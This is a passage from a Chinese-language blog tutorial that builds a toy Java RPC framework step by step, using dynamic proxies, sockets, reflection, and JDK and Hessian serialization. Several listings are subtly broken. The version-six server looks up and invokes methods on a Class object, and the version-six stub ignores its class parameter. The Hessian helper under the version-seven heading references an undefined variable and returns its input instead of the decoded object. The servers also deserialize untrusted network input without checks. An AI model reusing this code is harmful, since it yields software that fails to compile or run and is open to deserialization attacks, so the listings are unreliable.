<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IUserService <span class="title">getStub</span><span class="params">()</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(baos);</span><br><span class="line">                dos.writeInt(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">                s.getOutputStream().write(baos.toByteArray());</span><br><span class="line">                s.getOutputStream().flush();</span><br><span class="line"></span><br><span class="line">                DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">                <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">                String name = dis.readUTF();</span><br><span class="line">                User user = <span class="keyword">new</span> User(id, name);</span><br><span class="line"></span><br><span class="line">                dos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUserService service = Stub.getStub();</span><br><span class="line">        System.out.println(service.findUserById(<span class="number">123</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用了动态代理的知识，简单来说，<code>Stub.getStub</code>这个静态方法返回了一个动态对象，其中这个动态对象实现了<code>UserService</code>接口。</p>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.sun.proxy.$Proxy0</span><br><span class="line">interface com.ca01h.rpc.common.IUserService</span><br><span class="line">User&#123;id&#x3D;123, name&#x3D;&#39;ca01h&#39;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四个版本">第四个版本</h2>
<p>上一个版本的Stub.java局限于处理<code>findUserById</code>这个函数，那么在这个版本中无论任何一个方法，都可以用通用的代码实现：</p>
<p>Stub.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IUserService <span class="title">getStub</span><span class="params">()</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(s.getOutputStream());</span><br><span class="line"></span><br><span class="line">                String methodName = method.getName();</span><br><span class="line">                Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line">                oos.writeUTF(methodName);</span><br><span class="line">                oos.writeObject(parametersTypes);</span><br><span class="line">                oos.writeObject(args);</span><br><span class="line">                oos.flush();</span><br><span class="line"></span><br><span class="line">                DataInputStream dis = <span class="keyword">new</span> DataInputStream(s.getInputStream());</span><br><span class="line">                <span class="keyword">int</span> id = dis.readInt();</span><br><span class="line">                String name = dis.readUTF();</span><br><span class="line">                User user = <span class="keyword">new</span> User(id, name);</span><br><span class="line"></span><br><span class="line">                oos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点就在于这6行代码，其实看着也挺明白的，拿到客户端传过来的方法名、参数类型、参数的值去找服务端的实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String methodName = method.getName();</span><br><span class="line">Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line">oos.writeUTF(methodName);</span><br><span class="line">oos.writeObject(parametersTypes);</span><br><span class="line">oos.writeObject(args);</span><br><span class="line">oos.flush();</span><br></pre></td></tr></table></figure>
<p>那么同样的，服务端的代码也得跟着变：</p>
<p>Server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.rpc01.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(out);</span><br><span class="line"></span><br><span class="line">        String methodName = ois.readUTF();</span><br><span class="line">        Class[] parametersTypes = (Class[]) ois.readObject();</span><br><span class="line">        Object[] args = (Object[]) ois.readObject();</span><br><span class="line">        </span><br><span class="line">        IUserService service = <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        Method method = service.getClass().getMethod(methodName, parametersTypes);</span><br><span class="line">        User user = (User)method.invoke(service, args); </span><br><span class="line">        dos.writeInt(user.getId());</span><br><span class="line">        dos.writeUTF(user.getName());</span><br><span class="line">        dos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过反射的方式向服务端调用函数。</p>
<h2 id="第五个版本">第五个版本</h2>
<p>这个版本就解决一个问题：返回值用Object封装，支持任意类型。</p>
<p>Stub.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IUserService <span class="title">getStub</span><span class="params">()</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(s.getOutputStream());</span><br><span class="line"></span><br><span class="line">                String methodName = method.getName();</span><br><span class="line">                Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line">                oos.writeUTF(methodName);</span><br><span class="line">                oos.writeObject(parametersTypes);</span><br><span class="line">                oos.writeObject(args);</span><br><span class="line">                oos.flush();</span><br><span class="line"></span><br><span class="line">                ObjectInputStream ois= <span class="keyword">new</span> ObjectInputStream(s.getInputStream());</span><br><span class="line">                User user = (User) ois.readObject();</span><br><span class="line"></span><br><span class="line">                oos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>服务端相应变化：</p>
<p>Server.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.rpc01.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line"></span><br><span class="line">        String methodName = ois.readUTF();</span><br><span class="line">        Class[] parametersTypes = (Class[]) ois.readObject();</span><br><span class="line">        Object[] args = (Object[]) ois.readObject();</span><br><span class="line"></span><br><span class="line">        IUserService service = <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        Method method = service.getClass().getMethod(methodName, parametersTypes);</span><br><span class="line">        User user = (User)method.invoke(service, args);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        oos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第六个版本">第六个版本</h2>
<p>以上版本的<code>Stub.getStub</code>只能拿到<code>IUserService</code>一个接口，现在需要能够帮我生成更多类型的代理。</p>
<p>Client.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUserService userService = (IUserService) Stub.getStub(IUserService.class);</span><br><span class="line">        System.out.println(userService.findUserById(<span class="number">123</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Stub.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getStub</span><span class="params">(Class clazz)</span></span>&#123;</span><br><span class="line">        InvocationHandler h = <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                Socket s = <span class="keyword">new</span> Socket(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">                ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(s.getOutputStream());</span><br><span class="line">                String clazzName = clazz.getName();</span><br><span class="line">                String methodName = method.getName();</span><br><span class="line">                Class[] parametersTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">                oos.writeUTF(clazzName);</span><br><span class="line">                oos.writeUTF(methodName);</span><br><span class="line">                oos.writeObject(parametersTypes);</span><br><span class="line">                oos.writeObject(args);</span><br><span class="line">                oos.flush();</span><br><span class="line"></span><br><span class="line">                ObjectInputStream ois= <span class="keyword">new</span> ObjectInputStream(s.getInputStream());</span><br><span class="line">                User user = (User) ois.readObject();</span><br><span class="line"></span><br><span class="line">                oos.close();</span><br><span class="line">                s.close();</span><br><span class="line">                <span class="keyword">return</span> user;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Object o = Proxy.newProxyInstance(IUserService.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;IUserService.class&#125;, h);</span><br><span class="line">        System.out.println(o.getClass().getName());</span><br><span class="line">        System.out.println(o.getClass().getInterfaces()[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> (IUserService) o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Server.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.IUserService;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.common.User;</span><br><span class="line"><span class="keyword">import</span> com.ca01h.rpc.rpc01.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> running = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span> (running) &#123;</span><br><span class="line">            Socket s = ss.accept();</span><br><span class="line">            process(s);</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;</span><br><span class="line">        ss.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Socket s)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        InputStream in = s.getInputStream();</span><br><span class="line">        OutputStream out = s.getOutputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line"></span><br><span class="line">        String clazzName = ois.readUTF();</span><br><span class="line">        String methodName = ois.readUTF();</span><br><span class="line">        Class[] parametersTypes = (Class[]) ois.readObject();</span><br><span class="line">        Object[] args = (Object[]) ois.readObject();</span><br><span class="line"></span><br><span class="line">        Class clazz = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从服务注册表中找到具体的类</span></span><br><span class="line">        clazz = com.ca01h.rpc.rpc06.UserServiceImpl.class;</span><br><span class="line">        Method method = clazz.getClass().getMethod(methodName, parametersTypes);</span><br><span class="line">        User user = (User)method.invoke(clazz, args);</span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        oos.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第七个版本">第七个版本</h2>
<p>之前我们用的都是JDKSerialize来进行序列化和反序列化，这种序列化方式时间长数据多，为了演示方便，可以使用Hessian库来进行序列化和反序列化。</p>
<p>Hessian.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ca01h.rpc.rpc06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output output = <span class="keyword">new</span> Hessian2Output(baos);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        output.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        baos.close();</span><br><span class="line">        output.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] unserialize(<span class="keyword">byte</span>[] bytes) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        Hessian2Input input = <span class="keyword">new</span> Hessian2Input(baos);</span><br><span class="line">        Object o = input.readObject();</span><br><span class="line"></span><br><span class="line">        bais.close();</span><br><span class="line">        input.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
